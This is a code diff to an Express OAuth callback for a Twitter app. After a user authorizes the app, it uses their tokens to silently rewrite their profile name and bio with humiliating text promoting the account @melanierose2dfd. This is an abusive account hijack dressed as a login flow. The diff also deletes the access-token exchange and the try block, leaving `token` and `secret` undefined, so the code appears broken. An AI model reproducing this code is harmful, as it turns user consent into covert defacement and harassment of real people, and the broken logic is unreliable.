@@ -58,28 +58,23 @@ app.get('/callback', async (req, res) => {
     data: { oauth_token, oauth_verifier }
   };
 
-  try {
-    const response = await axios.post("https://api.twitter.com/oauth/access_token", null, {
-      headers: oauth.toHeader(oauth.authorize(request_data, { key: oauth_token, secret: token_secret })),
-      params: { oauth_verifier }
-    });
-
-    const access = new URLSearchParams(response.data);
-    const token = access.get("oauth_token");
-    const secret = access.get("oauth_token_secret");
-    const profileUpdate = {
-        name: "Melanies ClickSlxt",
-        description: "Sick patient to @melanierose2dfd 😵‍💫😵‍💫 || Addicted to dopamine and making terrible financial decisions 😷🥴💉 || Currently in deep debt to Princess Melanie 💖"
-      };
-    await axios.post("https://api.twitter.com/1.1/account/update_profile.json", null, {
-      headers: oauth.toHeader(oauth.authorize({
+ const profileUpdate = {
+  name: "Melanies ClickSlxt",
+  description: "Sick patient to @melanierose2dfd 😵‍💫😵‍💫 || Addicted to dopamine and making terrible financial decisions 😷🥴💉 || Currently in deep debt to Princess Melanie 💖"
+  };
+  
+  const params = new URLSearchParams(profileUpdate);
+  
+  await axios.post("https://api.twitter.com/1.1/account/update_profile.json", params.toString(), {
+    headers: {
+      ...oauth.toHeader(oauth.authorize({
         url: "https://api.twitter.com/1.1/account/update_profile.json",
         method: "POST",
-        data: profileUpdate 
+        data: profileUpdate
       }, { key: token, secret })),
       "Content-Type": "application/x-www-form-urlencoded"
     }
-    });
+  });
 
     const html = `
     <html>
